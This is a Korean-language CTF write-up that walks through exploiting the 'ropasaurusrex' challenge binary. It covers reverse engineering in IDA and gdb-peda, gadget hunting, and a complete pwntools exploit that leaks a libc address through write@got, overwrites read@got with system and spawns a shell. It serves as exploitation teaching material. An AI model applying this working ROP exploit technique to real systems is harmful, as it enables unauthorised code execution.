# ROP - ropasaurusrex

- https://m.blog.naver.com/PostView.nhn?blogId=pdg0615&logNo=220942691586&proxyReferer=https%3A%2F%2Fwww.google.com%2F

- 32비트 프로그램이므로 내가 가지고 있는 64비트 리눅스에서 실행하지 못해서, 다음의 명령어를 실행해주었다.

  ```ㅊ
   - sudo dpkg --add-architecture i386
  
    - sudo apt-get update
  
    - sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 zlib1g:i386
  ```



## 파일

![1568204705088](https://user-images.githubusercontent.com/52530785/65146131-13752e00-da56-11e9-8ac3-ea407da14a11.png)

## IDA

![1568203999365](https://user-images.githubusercontent.com/52530785/65146130-13752e00-da56-11e9-9711-22e311412d6b.png)

## main 함수

![1568203857602](https://user-images.githubusercontent.com/52530785/65146129-13752e00-da56-11e9-9cb5-b109390414bc.png)

- write(1, "WIN\n", 4u);	--> 첫번째 인자 1은 stdout



### sub_80483F4

![1568203825294](https://user-images.githubusercontent.com/52530785/65146128-13752e00-da56-11e9-8013-2bcda3125e10.png)

- read(0, &buf, 0x100u);	--> 첫번째 인자 0은 stdin

  ​												세번째 인자 0x100u 의 u는 unsigned



## gdb-peda

- b *main 	해서 메인함수가 안걸리면

![1568205127402](https://user-images.githubusercontent.com/52530785/65146132-140dc480-da56-11e9-8933-d43b957032db.png)

- info fun 	으로 확인 후

![1568205139170](https://user-images.githubusercontent.com/52530785/65146133-140dc480-da56-11e9-912f-69f6b9271e03.png)

- __libc_start_main 에 breakpoint 걸고 

![1568205379582](https://user-images.githubusercontent.com/52530785/65146134-140dc480-da56-11e9-9617-bd6334da4866.png)

- run 시킨 후 ni로 넘기다 보면 main으로 넘어갈 수 있음.

![1568205658258](https://user-images.githubusercontent.com/52530785/65146135-140dc480-da56-11e9-9b67-fa13497b660a.png)

- call 하는 부분이 있는데 거기에 함수 이름이 안나오면 si로 들어가서 보기



- main문

![1568205859950](https://user-images.githubusercontent.com/52530785/65146136-14a65b00-da56-11e9-848e-6665e154d63d.png)





### 필요한 부분

- main의 ret

- write@plt	--> 0x0804830c
- read@plt	--> 0x0804832c

![1568206111056](https://user-images.githubusercontent.com/52530785/65146137-14a65b00-da56-11e9-82c6-8aa16dc472cb.png)





## Tip

### ldd

![1568212461874](https://user-images.githubusercontent.com/52530785/65146138-14a65b00-da56-11e9-9f4b-5ad7d241703d.png)

- ldd 
  - 현재 쓰이고 있는 libc의 주소를 구할 수 있지만, ASLR 떄문에 주소가 매번 바껴서 의미는 없음
  - 해당 바이너리가 어떤 lib들을 사용하는지 보여줌



### Pwntools

![1568443741069](https://user-images.githubusercontent.com/52530785/65146125-12dc9780-da56-11e9-9a11-05db4dd01dde.png)



결과

![1568219359196](https://user-images.githubusercontent.com/52530785/65146140-153ef180-da56-11e9-98ae-9656edccd38b.png)





이제 이를 이용해 쉘을 띄워야한다.



### 시나리오

![1568443842960](https://user-images.githubusercontent.com/52530785/65146126-12dc9780-da56-11e9-854c-a997f5c7ddce.png)





## Gadget

- Gadget 찾는법은 일일이 손으로 찾는 방법

- gdb-peda 의 ropgadget 명령어 사용하여 찾아내는 방법

- rp++ 프로그램을 통해 알아내는 방법 ( 자세한 내용은 인터넷 검색 )

  이 있다.

  

- 여기서는 gdb ropasourusrex 를 통해 알아냄

![1568276602528](https://user-images.githubusercontent.com/52530785/65146141-153ef180-da56-11e9-860b-2c15adcbcc9b.png)





## exploit

![1568286960497](https://user-images.githubusercontent.com/52530785/65146124-12dc9780-da56-11e9-8d22-dcb79beb6ca7.png)

```python
#!/usr/bin/python
from pwn import *

context.log_level = 'debug'

p = process('./ropasaurusrex')
binary = ELF('./ropasaurusrex')
lib = ELF('/lib/i386-linux-gnu/libc.so.6')

#gdb.attach(p)

write_got = 0x8049614
read_plt = 0x0804832C
read_got = 0x0804961C
pppr = 0x80484b6
sh='/bin/sh\x00'

write_offset = lib.symbols['write']
system = lib.symbols['system']


write_plt = binary.plt['write']
writable = binary.bss() + 0x100

log.info('write addr: ' + hex(write_plt))
log.info('writable addr: ' + hex(writable))

payload = 'a'*0x88 + 'b'*4
payload += p32(write_plt) + p32(pppr) + p32(1) + p32(write_got) + p32(4)
payload += p32(read_plt) + p32(pppr) + p32(0) + p32(writable) + p32(8)
payload += p32(read_plt) + p32(pppr) + p32(0) + p32(read_got) + p32(4)
payload += p32(read_plt) + p32(1) + p32(writable)

p.send(payload)

leak = u32(p.recv(4))	//payload에 넣어둔 write가 got 읽어서 4바이트 출력해주는 것을 읽음(write_got)	--> 32비트일 때는 4바이트, 64비트일때는 8바이트 읽어와야함
log.info('leaked write: ' + hex(leak))
libc_base = leak - write_offset
log.info('leaked libc base: ' + hex(libc_base))
p.send(sh)
p.send(p32(libc_base+system))

p.interactive()

```



![1568279348241](https://user-images.githubusercontent.com/52530785/65146142-153ef180-da56-11e9-8ec5-69dce500dd6e.png)



쉘 따짐







## exploit 2

- 일단 기본적인 ex를 써놓았다.

![1568280029979](https://user-images.githubusercontent.com/52530785/65146108-107a3d80-da56-11e9-98c9-ae8efa565185.png)

- process

- ropasaurusrex의 바이너리 

  - -> 바이너리 내부에 뭐가 있는지 출력해준다.
  - ![1568280481352](https://user-images.githubusercontent.com/52530785/65146112-1112d400-da56-11e9-82f6-0668d5079d9b.png)

- ldd ./ropasaurusrex  명령어를 통해 알아낸 libc 

![1568280329983](https://user-images.githubusercontent.com/52530785/65146109-107a3d80-da56-11e9-8dd1-ecb98c4e225f.png)
  - -> libc 내부에 뭐가 있는지 출력해준다.
  - ![1568280459289](https://user-images.githubusercontent.com/52530785/65146111-1112d400-da56-11e9-98db-5fa23536d08f.png)

- libc 내에 있는 write 주소

- libc 내에 있는 system 주소

- binary 내부에 있는 write와 read의 plt 와 got => IDA로 보면 보인다.

- 내가 /bin/sh를 입력할 bss의 주소 (안전하게 하기 위해 0x100) 추가

- /bin/sh 를 쓰는데 뒤에 Null 이 들어가 있어야해서 \x00 추가함

- log.info를 통해 위에서 정의해둔 주소값들 출력

![1568280379504](https://user-images.githubusercontent.com/52530785/65146110-107a3d80-da56-11e9-8bc2-31215f400ed2.png)

- write와 read의 인자는 3개가 들어가기 때문에 pop, pop, pop, ret이 필요하므로

  ```c
  gdb ropasaurusrex 를 통해 pop, pop, pop, ret 인 Gadget 찾아냄
  ```

![1568280628757](https://user-images.githubusercontent.com/52530785/65146115-1112d400-da56-11e9-9497-63a570b44672.png)

![1568280673637](https://user-images.githubusercontent.com/52530785/65146116-1112d400-da56-11e9-8a58-a20764ed08f4.png)

![1568280693831](https://user-images.githubusercontent.com/52530785/65146117-11ab6a80-da56-11e9-81a0-d9761e8aac22.png)

  

  - breakpoint를 걸고 ni로 쭉 넘기다 보면
![1568280756821](https://user-images.githubusercontent.com/52530785/65146118-11ab6a80-da56-11e9-9133-2c8a6dfc058e.png)

위와 같이 pop, pop, pop, ret 인 Gadget이 보인다.



POC에 주소 추가 하기



위와 같이 pppr을 추가해주고

![1568282277699](https://user-images.githubusercontent.com/52530785/65146121-12440100-da56-11e9-937d-bd072261c972.png)

pppr 은 문자가 아니기 때문에 작은따옴표로 싸지 않는다.



![1568280881943](https://user-images.githubusercontent.com/52530785/65146119-11ab6a80-da56-11e9-9684-ff329299a30e.png)

미리 알아낸 write_got 주소값 안에 있는 값을 알아오고, 

밀어넣은 write가 끝나면 pppr을 써서 스택을 정리한다.

​	-> (write를 이용해 주소 leak을 하고 pppr을 이용해 스택을 정리한다.)



### -------------------------------------------------------

이거는

![1568283925710](https://user-images.githubusercontent.com/52530785/65146123-12440100-da56-11e9-9940-41bb1cab07fd.png)

write로 write@got leak하고 writable영역에 /bin/sh 적고 바로 read를 호출했는데

read@got 는 read_libc를 가리키고있으니까 그전에 read@got에 system_libc값을 적어줘야한다.



----

![1568282304749](https://user-images.githubusercontent.com/52530785/65146122-12440100-da56-11e9-9e70-b53d43717210.png)

write로 write_got 주소값 안에 있는 값을 알아내서 가져오고, 이를 통해 libc 함수 주소를 계산한다.

/bin/sh + null 을 사용하기 위해 read로 bss 영역에 8 바이트를 적는다.

그리고 read를 다시 해서 libc read를 간접 호출한 후 read_got 에 libc system 주소와 /bin/sh\x00 을 넣어준다.





![1568282240895](https://user-images.githubusercontent.com/52530785/65146120-11ab6a80-da56-11e9-996f-812c580d4f2a.png)

쉘이 따졌다.





---

recvuntil 을 안쓰는 이유, 

사우르스는 vuln 함수로 들어갔다가 다시 main으로 나와서 win을 출력하는데, vuln 함수의 ret을 터뜨린거라 main으로 다시 안돌아오기 때문



![1568797476667](https://user-images.githubusercontent.com/52530785/65146127-12dc9780-da56-11e9-8dbb-0a1d1016ed24.png)

